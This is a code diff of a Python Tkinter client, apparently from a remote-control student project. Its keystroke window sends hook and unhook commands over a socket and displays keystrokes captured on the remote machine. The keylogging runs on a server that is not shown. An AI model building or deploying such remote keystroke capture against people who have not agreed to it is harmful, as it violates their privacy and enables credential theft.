@@ -354,45 +354,44 @@ def PrintScreen():
     but1.grid(row=1,column=1)
 
 def Keystroke():
-    size = 0
     string = ''
     newApp = Tk()
-    newApp.geometry("500x300")
+    newApp.geometry("410x300")
     newApp.title("Keystroke")  
     table = Frame(newApp, padx=20, pady = 20, borderwidth=5)
     table.grid(row=1,column=0)
-    e = Entry(newApp, width = 55)
-    e.grid(row = 1, column = 0,ipadx=10, ipady=100,columnspan= 4)
+    e = Text(newApp, width = 50, heigh = 13)
+    e.grid(row = 1, column = 0, columnspan= 4)
     unhook_press = False
-    hook = False
+    hook_press = False
+    
     def hook():
-        nonlocal unhook_press, hook
-        hook = True
+        nonlocal unhook_press, hook_press
+        if hook_press == True:
+            return
+        hook_press = True
         unhook_press = False
         client.sendall(bytes("Hook Key","utf8"))
         check = client.recv(1024).decode("utf8")
+
     def unhook():
-        nonlocal hook
-        if hook == True:
-            nonlocal size, string, unhook_press
+        nonlocal hook_press, unhook_press
+        if hook_press == True:
+            nonlocal string, unhook_press
             client.sendall(bytes("Unhook Key","utf8"))       
-            size , string = Recieve_Hook(client, HOST, PORT)
-            
-            if unhook_press == False:
-                client.sendall(bytes("Unhook Key","utf8"))
-                size , string = Recieve_Hook(client, HOST, PORT)
-                unhook_press = True
-            hook = False
+            string = Recieve_Hook(client)
+            unhook_press = True
+            hook_press = False
     def xem():
-        nonlocal size, string, unhook_press
+        nonlocal string, unhook_press
         if unhook_press == False: 
             client.sendall(bytes("Unhook Key","utf8"))
-            size , string = Recieve_Hook(client, HOST, PORT)
+            string = Recieve_Hook(client)
             unhook_press = True
-        e.delete(0,END)
-        e.insert(0,string)
+        e.delete(1.0,END)
+        e.insert(1.0,string)
     def xoa():
-        e.delete(0,END)
+        e.delete(1.0,END)
 
 
     Hook = Button(newApp, text = "Hook", padx = 20, pady = 20, command = hook).grid(row = 0,column = 0)
